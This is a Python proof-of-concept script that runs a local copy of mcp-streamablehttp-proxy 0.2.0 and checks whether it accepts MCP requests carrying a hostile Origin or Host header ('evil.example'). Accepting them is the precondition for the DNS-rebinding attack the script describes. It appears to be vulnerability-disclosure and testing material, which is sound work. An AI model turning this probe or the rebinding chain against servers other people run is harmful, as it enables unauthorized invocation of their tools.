#!/usr/bin/env python3
"""Quick PoC: demonstrate that mcp-streamablehttp-proxy v0.2.0 accepts MCP
JSON-RPC requests regardless of the Origin and Host headers a browser
would send post-DNS-rebind.

This script does NOT do DNS rebinding (that's `make demo-full`). What it
does is the underlying vulnerability proof: send the same MCP request
three ways — once with sensible headers, once with a hostile Origin, once
with a hostile Host — and observe that all three are accepted identically.

The server doesn't distinguish; that's the bug. DNS rebinding is just the
mechanism that lets a browser do this from an unrelated origin.

Usage:
    python3 quick_probe.py             # default: pins mcp-streamablehttp-proxy v0.2.0
    python3 quick_probe.py --no-install  # skip install if package is already on PATH

Requires: Python 3.10+. Uses only stdlib + `mcp-streamablehttp-proxy` itself.
"""

from __future__ import annotations

import argparse
import json
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request

VICTIM_PORT = 3000
INITIALIZE_BODY = {
    "jsonrpc": "2.0",
    "id": 1,
    "method": "initialize",
    "params": {
        "protocolVersion": "2025-06-18",
        "capabilities": {},
        "clientInfo": {"name": "dns-rebind-poc", "version": "0"},
    },
}


def pip_install(package: str) -> None:
    print(f"[+] pip install {package!r} (quiet)")
    result = subprocess.run(
        [sys.executable, "-m", "pip", "install", "--quiet", package],
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        sys.stderr.write(f"pip install failed:\n{result.stderr}\n")
        sys.exit(2)


def launch_victim() -> subprocess.Popen:
    """Launch mcp-streamablehttp-proxy wrapping mcp-server-time."""
    print(f"[+] launching victim: mcp-streamablehttp-proxy → mcp-server-time on localhost:{VICTIM_PORT}")
    return subprocess.Popen(
        [
            "mcp-streamablehttp-proxy",
            sys.executable,
            "-m",
            "mcp_server_time",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def wait_for_port(port: int, timeout_sec: float = 10.0) -> bool:
    deadline = time.time() + timeout_sec
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.3):
                return True
        except (ConnectionRefusedError, OSError):
            time.sleep(0.2)
    return False


def probe(label: str, headers: dict[str, str]) -> tuple[int, str]:
    """Send the initialize request with the given headers. Return (status, response_text)."""
    body = json.dumps(INITIALIZE_BODY).encode("utf-8")
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/event-stream",
        **headers,
    }
    req = urllib.request.Request(
        f"http://127.0.0.1:{VICTIM_PORT}/mcp",
        data=body,
        headers=headers,
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=5.0) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")


def is_mcp_initialize_response(text: str) -> bool:
    """Is the response body the shape of a successful MCP initialize response?"""
    # SSE response sometimes; parse the data: line if present
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("data:"):
            line = line[len("data:"):].strip()
        try:
            obj = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(obj, dict) and obj.get("jsonrpc") == "2.0" and "result" in obj:
            res = obj["result"]
            if isinstance(res, dict) and "protocolVersion" in res:
                return True
    return False


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument(
        "--no-install",
        action="store_true",
        help="Skip pip install — assume mcp-streamablehttp-proxy + mcp-server-time are already installed.",
    )
    args = p.parse_args()

    if not args.no_install:
        pip_install("mcp-streamablehttp-proxy==0.2.0")
        pip_install("mcp-server-time")

    server = launch_victim()
    try:
        if not wait_for_port(VICTIM_PORT, timeout_sec=10.0):
            sys.stderr.write(f"victim did not bind localhost:{VICTIM_PORT} within 10 sec\n")
            return 2
        print(f"[+] victim listening on localhost:{VICTIM_PORT}")
        print()

        # ── probe 1: legitimate same-origin request ───────────────────────
        print("[+] probe 1: legitimate request (Origin: http://localhost:3000)")
        status, text = probe("probe1", {"Origin": "http://localhost:3000", "Host": "localhost:3000"})
        ok = is_mcp_initialize_response(text)
        marker = "MCP initialize response" if ok else f"non-MCP response: {text[:80]}"
        print(f"    → status={status}, body shape: {marker}")
        print()

        # ── probe 2: hostile Origin ───────────────────────────────────────
        print("[+] probe 2: request with hostile Origin: http://evil.example")
        status, text = probe("probe2", {"Origin": "http://evil.example", "Host": "localhost:3000"})
        ok2 = is_mcp_initialize_response(text)
        marker = "MCP initialize response (UNAUTHORIZED ACCEPTED)" if ok2 else f"rejected ({text[:60]})"
        print(f"    → status={status}, body shape: {marker}")
        print()

        # ── probe 3: hostile Host header ──────────────────────────────────
        print("[+] probe 3: request with hostile Host: evil.example")
        status, text = probe("probe3", {"Origin": "http://localhost:3000", "Host": "evil.example"})
        ok3 = is_mcp_initialize_response(text)
        marker = "MCP initialize response (UNAUTHORIZED ACCEPTED)" if ok3 else f"rejected ({text[:60]})"
        print(f"    → status={status}, body shape: {marker}")
        print()

        # ── verdict ───────────────────────────────────────────────────────
        print("─" * 65)
        if ok2 and ok3:
            print("VERDICT: VULNERABLE")
            print()
            print("  Server accepted MCP initialize requests carrying both a")
            print("  hostile Origin header AND a hostile Host header — exactly the")
            print("  conditions a DNS-rebound browser request presents. The server")
            print("  has no Origin/Host validation middleware, so the DNS-rebind")
            print("  attack chain (browser tab → rebind → invoke MCP tool) works")
            print("  with no further compromise required.")
            print()
            print("  For the full reproduction including the browser-side rebind:")
            print("    make demo-full")
            print()
            return 1     # non-zero — vulnerability confirmed
        else:
            print("VERDICT: SERVER REJECTED HOSTILE HEADERS")
            print()
            print("  The server returned non-MCP responses to one or both of the")
            print("  hostile-header probes. Either the package has been patched,")
            print("  middleware has been added, or the test is running against a")
            print("  different version than mcp-streamablehttp-proxy==0.2.0.")
            print()
            return 0
    finally:
        print("[+] cleanup: terminating victim")
        server.terminate()
        try:
            server.wait(timeout=3.0)
        except subprocess.TimeoutExpired:
            server.kill()


if __name__ == "__main__":
    sys.exit(main())
